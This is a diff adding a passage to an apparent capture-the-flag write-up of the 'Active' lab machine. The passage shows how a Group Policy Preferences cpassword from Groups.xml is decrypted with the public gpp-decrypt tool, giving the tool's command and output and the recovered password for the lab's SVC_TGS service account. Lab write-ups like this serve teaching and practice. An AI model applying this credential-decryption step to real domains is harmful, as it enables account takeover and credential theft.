@@ -130,4 +130,24 @@ and password that looks encrypted:
 edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ```
 
+We look this up online and see that it is a Group Policy Preferences (GPP) AES256 encrypted password with a known static key. We can use the tool gpp-decrypt to decrypt this password (https://github.com/t0thkr1s/gpp-decrypt).
+
+We download the gpp-decrypt from the github instructions and use it with python3 to decrypt the password. 
+```
+sudo python3 gpp-decrypt.py -f ~/Downloads/Groups.xml
+/home/kchen/gpp-decrypt/gpp-decrypt.py:10: SyntaxWarning: invalid escape sequence '\ '
+  banner = '''
+
+                               __                                __ 
+  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
+ / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
+ \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
+/___/  /_/    /_/                                /___/  /_/         
+
+[ * ] Username: active.htb\SVC_TGS
+[ * ] Password: GPPstillStandingStrong2k18
+```
+Now we have the password for the domain TGS service account: GPPstillStandingStrong2k18
+
+
 
